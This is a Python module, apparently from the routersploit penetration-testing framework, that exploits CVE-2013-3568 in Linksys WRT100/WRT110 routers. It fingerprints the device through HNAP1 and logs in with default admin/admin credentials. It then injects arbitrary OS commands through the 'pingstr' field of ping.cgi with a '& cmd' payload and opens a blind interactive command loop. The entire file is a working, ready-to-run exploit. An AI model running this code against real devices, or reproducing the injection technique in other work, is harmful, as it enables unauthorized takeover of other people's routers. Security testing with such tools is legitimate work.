from routersploit import (
    exploits,
    print_success,
    print_error,
    print_status,
    http_request,
    mute,
    validators,
    shell
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Linksys WRT100/WRT110 devices Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands on operating system level.
    """
    __info__ = {
        'name': 'Linksys WRT100/WRT110 RCE',
        'description': 'Module exploits remote command execution in Linksys WRT100/WRT110 devices.'
                       'If the target is vulnerable, command loop is invoked that allows executing commands'
                       'on operating system level.',
        'authors': [
            'Craig Young',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3568',
            'http://seclists.org/bugtraq/2013/Jul/78',
        ],
        'devices': [
            'Linksys WRT100',
            'Linksys WRT110'
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    username = exploits.Option('admin', 'Username to log in')
    password = exploits.Option('admin', 'Password to log in')

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")

            if self.test_auth():
                print_status("Invoking command loop...")
                print_status("This is blind command injection. Response is not available.")
                shell(self, architecture="mipsle")
        else:
            print_error("Target is not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/ping.cgi".format(self.target, self.port)

        payload = "& {}".format(cmd)
        data = {
            "pingstr": payload
        }

        http_request(method="POST", url=url, data=data, auth=(self.username, self.password))
        return ""

    @mute
    def check(self):
        url = "{}:{}/HNAP1/".format(self.target, self.port)

        response = http_request(method="GET", url=url)

        if response is not None and "<ModelName>WRT110</ModelName>" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable

    def test_auth(self):
        url = "{}:{}/".format(self.target, self.port)

        print_status("Trying to authenticate")
        response = http_request(method="GET", url=url, auth=(self.username, self.password))

        if response is None or response.status_code == 401 or response.status_code == 404:
            print_error("Could not authenticate {}:{}".format(self.username, self.password))
            return False
        else:
            print_success("Successful authentication {}:{}".format(self.username, self.password))
            return True
